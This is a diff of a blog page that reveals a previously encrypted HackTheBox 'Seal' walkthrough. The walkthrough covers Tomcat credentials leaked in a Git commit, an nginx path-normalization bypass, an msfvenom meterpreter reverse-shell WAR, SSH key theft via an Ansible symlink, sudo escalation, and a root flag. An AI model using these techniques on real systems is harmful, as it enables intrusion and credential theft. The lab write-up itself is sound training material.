@@ -4,7 +4,11 @@
 <title>Seal - HackTheBox machine :: RoundofThree</title>
 <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<meta content=" Rank: medium " name="description"/>
+<meta content="Foothold 1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)
+2- After visiting seal.htb:8080 redirects to
+http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0; node0 is repeated. 401 Unauthorized. jsessionid cookie is passed in the url, redirect param is &amp;lsquo;/&amp;rsquo;.
+3- Register an account in Gitbucket and access the source code of the webapp. There are three directories: app, tomcat, nginx. The TODO list mentions:
+3.1- Remove mutual authentication for dashboard, setup registration and login features." name="description"/>
 <meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
 <meta content="noodp" name="robots"/>
 <link href="/labs/seal/" rel="canonical"/>
@@ -17,7 +21,11 @@
 <meta content="en" property="og:locale"/>
 <meta content="article" property="og:type"/>
 <meta content="Seal - HackTheBox machine" property="og:title"/>
-<meta content=" Rank: medium " property="og:description"/>
+<meta content="Foothold 1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)
+2- After visiting seal.htb:8080 redirects to
+http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0; node0 is repeated. 401 Unauthorized. jsessionid cookie is passed in the url, redirect param is &amp;lsquo;/&amp;rsquo;.
+3- Register an account in Gitbucket and access the source code of the webapp. There are three directories: app, tomcat, nginx. The TODO list mentions:
+3.1- Remove mutual authentication for dashboard, setup registration and login features." property="og:description"/>
 <meta content="/labs/seal/" property="og:url"/>
 <meta content="RoundofThree" property="og:site_name"/>
 <meta content="/favicon.png" property="og:image"/>
@@ -74,19 +82,58 @@
     
   </span>
 <div class="post-content"><div>
-<ul>
-<li>Rank: medium</li>
-</ul>
-<div class="hugo-encryptor-container">
-<div class="hugo-encryptor-prompt">
-<p>Part of this article is encrypted with password:</p>
-</div>
-<div class="hugo-encryptor-form">
-<input class="hugo-encryptor-input" placeholder="Please input the password"/>
-<input class="hugo-encryptor-button" onclick="_click_handler(this)" type="button" value="Click to verify"/>
-</div>
-<div class="hugo-encryptor-cipher-text" style="display: none;">+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</div>
-</div>
+<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
+<p>1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)</p>
+<p>2- After visiting seal.htb:8080 redirects to</p>
+<pre tabindex="0"><code>http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F
+
+Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0;  node0 is repeated. 
+401 Unauthorized. 
+</code></pre><p>jsessionid cookie is passed in the url, redirect param is ‘/’.</p>
+<p>3- Register an account in Gitbucket and access the source code of the webapp. There are three directories: app, tomcat, nginx.
+The TODO list mentions:</p>
+<pre><code>3.1- Remove mutual authentication for dashboard, setup registration and login features. &lt;-- what is mutual auth?
+
+3.2- Deploy updated Tomcat confs. &lt;-- look at what updates are pending in the commit diff files. 
+	&lt;user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/&gt; in tomcat-users.xml 
+
+3.3- Disable manager and host-manager. &lt;-- what is this? 
+</code></pre>
+<p>4- Read about Tomcat. Tomcat has a web interface to manage webapps and deployment, which by default can be accessed at /manager/html. Only tomcat users which have manager-gui role have access.</p>
+<p>5- /manager/html returns 403 Forbidden by nginx. This is due to whitelisting. A bypass to this is directory path traversal. This blog explains how java applications suffer from path normalization vulnerability.
+<a href="https://thehackingfactory.com/dot-dot-semicolon-rce">https://thehackingfactory.com/dot-dot-semicolon-rce</a></p>
+<p>See nginx/sites-enables/default: /manager/html, /host-manager/html, /admin/dashboard require ssl_client_verify to be SUCCESS, but we don’t have the client certificate. We can bypass the list with /manager/anything;/..;/html. Nginx sees /manager/anything;/..;/html, but Tomcat sees /manager/anything/../html.</p>
+<p>6- Deploy meterpreter reverse shell WAR file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">msfvenom -p java/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>tun0 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> -f war -o health.war 
+</code></pre></div><p>Catch POST packet in Burpsuite and change the url path to bypass the client certificate check by nginx.</p>
+<p>7- Metasploit listen to port 1234. Visit /health.</p>
+<p>8- getuid reveals we are user tomcat. There is a folder named ‘luis’ in /home folder. tomcat user doesn’t have permissions to read user.txt nor .ssh/id_rsa. The existence of .ansible directory hints that there may be some backup task. Explore /opt to find backups/.</p>
+<pre tabindex="0"><code>backups/
+--&gt; archives/ --&gt; backup-xxx-xxx.gz
+--&gt; playbook/ --&gt; run.yml 
+</code></pre><p>We cannot modify run.yml:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-yml" data-lang="yml">- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">localhost</span>
+  <span style="color:#f92672">tasks</span>:
+  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Copy Files</span>
+    <span style="color:#f92672">synchronize</span>: <span style="color:#ae81ff">src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes</span>
+  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Server Backups</span>
+    <span style="color:#f92672">archive</span>:
+      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/opt/backups/files/</span>
+      <span style="color:#f92672">dest</span>: <span style="color:#e6db74">"/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"</span>
+  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Clean</span>
+    <span style="color:#f92672">file</span>:
+      <span style="color:#f92672">state</span>: <span style="color:#ae81ff">absent</span>
+      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/opt/backups/files/</span>
+</code></pre></div><p>8- In run.yml, we can exploit copy_links=yes.</p>
+<pre tabindex="0"><code>ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa
+cp archives/backup-THE-MOST-RECENT-ONE.gz /tmp
+</code></pre><p>Download the gz file.
+file reveals it’s a tar gz file –&gt; <code>tar xvfz backup.tar.gz</code> –&gt; dashboard/ –&gt; see uploads/id_rsa</p>
+<p>9- <code>ssh -i id_rsa luis@seal.htb</code></p>
+<h2 id="privilege-escalation">Privilege escalation<a arialabel="Anchor" class="hanchor" href="#privilege-escalation">⌗</a> </h2>
+<p>10- sudo -l</p>
+<p>See <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/">https://gtfobins.github.io/gtfobins/ansible-playbook/</a>. It’s very straighforward since ansible playbook is an automation tool which can run any command.</p>
+<p>root.txt: 13302f0959a0be8c868a95076136a391</p>
 </div></div>
 </div>
 </div>
@@ -100,5 +147,5 @@
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
 </div>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script><script src="/decrypt.js"></script></body>
+</body>
 </html>
